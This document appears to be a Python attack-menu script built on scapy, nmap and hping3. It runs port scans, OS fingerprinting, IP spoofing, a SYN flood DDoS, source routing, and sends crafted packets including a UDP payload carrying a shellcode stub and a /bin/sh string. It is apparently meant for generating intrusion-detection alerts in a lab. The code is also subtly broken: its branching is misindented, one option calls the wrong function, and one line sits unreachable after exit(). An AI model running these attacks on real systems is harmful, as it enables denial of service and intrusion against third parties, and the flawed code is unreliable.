
import os
import logging
import subprocess
import time
import binascii

from scapy.all import *


while True:

    attack = int(input('Choose Attack:  '))
    ip = str(input("What is the IP of the Target:  "))
    obf = str(input("What is the your obfuscated IP (if applicable):  "))

    def icmp_scapy():
        ip_layer = IP(dst= ip)
        icmp_layer = ICMP()
        packet = ip_layer / icmp_layer
        send(packet)
        print("Packet Sent")

    def windows_messenger():
        ip_layer = IP(src=ip, dst=obf)
        udp_data = "B"*150
        udp_layer = UDP(dport=1026, sport=22344, len=150)
        send(ip_layer / udp_layer / Raw(udp_data))
        print("Packet Sent")
    def pgpnet_connection():
        ip_layer = IP(src=obf, dst=ip)
        udp_data = binascii.unhexlify('00000000000000000000000000000110020000000000000000880D00005C00000001000000010000005001010002030000240101000080010006800200028003000380040005800B0001000C000400015180000000240201000080010005800200018003000380040002800B0001000C00040001518000000010')
        length = len(udp_data)
        udp_layer = UDP(dport=500, sport=22344, len=length)
        send(ip_layer / udp_layer / Raw(udp_data))
        print("packet sent")
    def shell_code():
        ip_layer = IP(src='10.0.0.1', dst='10.0.0.2')
        udp_data = binascii.unhexlify('909090E8C0FFFFFF2f62696e2f7368') # Shellcode and /bin/sh string
        length = len(udp_data)
        udp_layer = UDP(dport=4444, sport=22344, len=length)
        send(ip_layer / udp_layer / Raw(udp_data))
        print("Packet Sent")

        if attack == 1:
        print("SYN Scan")
        subprocess.call(f"nmap -p 22 -sS {ip}", shell=True)
        subprocess.call(["ls", "-l"])
    elif attack == 2:
        print("Fin Scan")
        subprocess.call(f"nmap -sF -p 80 {ip}", shell=True)
    elif attack == 3:
        print("TCP Connect")
        subprocess.call(f"nmap {ip} -p 22 -sT", shell=True)
    elif attack == 4:
        print("XMAS Port Scan")
        subprocess.call(f"nmap -sX -p 80 {ip}", shell=True)
    elif attack == 5:
        print("NULL Port Scan")
        subprocess.call(f"nmap -sN -p 80 {ip}", shell=True)
    elif attack == 6:
        print("ACK Port Scan")
        subprocess.call(f"nmap -p 22 -sA {ip}", shell=True)
    elif attack == 7:
        print("Idle Port Scan")
        # subprocess.call("nmap -p 22 -sA 10.0.0.2", shell=True)
    elif attack == 8:
        print("UDP Port Scan")
        subprocess.call(f"nmap -sU {ip} -p 138", shell=True)
    elif attack == 9:
        print("Active OS Fingerprinting")
        subprocess.call(f"nmap -p 80 -O {ip}", shell=True)
    elif attack == 10:
        print("IP Spoofing")
        subprocess.call(f"hping3 -S {ip} -a {obf}-c 3 ", shell=True)
    elif attack == 12:
        print("DDOS: Syn Floods")
        subprocess.call(f"hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood {ip} ", shell=True)
    elif attack == 13:
        print("NMAP ICMP Ping")
        subprocess.call(f"ping {ip} -s 0 " , shell=True)
    elif attack == 14:
        print("ICMP Scapy")
        icmp_scapy()
    elif attack == 15:
        print("Nmap command attempt")
        subprocess.call(f"echo 'nmap%20' | nc {ip} 8080 " , shell=True)
        exit()
        subprocess.call(f'curl {ip}:8080/index.php?test=nmap%20')
    elif attack == 16:
        print("Source Routing")
        subprocess.call(f"hping3 -S -p 10 -c 5 --lsrr {obf} {ip}", shell=True)
    elif attack == 17:
        print("Windows Messenger Pop-Up Spam")
        subprocess.call(f"hping3 -S -p 10 -c 5 --lsrr {obf} {ip}", shell=True)
    elif attack == 18:
        print("ICMP Scapy")
        windows_messenger()
    elif attack == 19:
        print("PGPNet Connection")
        pgpnet_connection()
    elif attack == 20:
        print("Linux Shell Code")
        pgpnet_connection()      
    
   


        


    else:
        print("Blyat!@#")
        

